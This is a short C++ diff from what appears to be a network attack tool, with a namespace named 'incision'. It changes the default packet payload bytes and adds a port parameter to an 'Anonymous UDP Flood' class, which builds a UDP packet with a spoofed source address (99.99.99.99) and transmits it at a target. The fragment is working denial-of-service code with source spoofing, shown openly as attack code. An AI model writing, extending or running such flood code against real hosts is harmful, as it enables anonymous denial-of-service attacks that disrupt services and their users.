@@ -11,7 +11,7 @@ namespace incision {
 	inline int randomPort() { return rand() % 65536; }
 	inline int randomCommonPort() { return (rand() % 64512) + 1024; } // at least 1024
 
-	data::Bytes defaultPayload = {0x73, 0x6f, 0x72, 0x72, 0x79, 0x21, 0x21, 0x21}; // sorry!!!
+	data::Bytes defaultPayload = {0x6C, 0x6F, 0x76, 0x65, 0x68, 0x61, 0x73, 0x66, 0x6F, 0x75, 0x6E, 0x64, 0x61, 0x77, 0x61, 0x79}; // lovehasfoundaway
 
 	class Attack {
 
@@ -117,7 +117,7 @@ namespace incision {
 
 		public:
 		
-			AnonymousUDPFlood(string target, data::Bytes payload=defaultPayload): target(target), payload(payload), pkt(smake::smakeUDP("99.99.99.99", target, 99999, 99999, payload)) {}
+			AnonymousUDPFlood(string target, int port=9999, data::Bytes payload=defaultPayload): target(target), payload(payload), pkt(smake::smakeUDP("99.99.99.99", target, port, port, payload)) {}
 
 			inline string getName() override { return "Anonymous UDP Flood"; }
 			inline void atk() override { upl.transmit(pkt); }
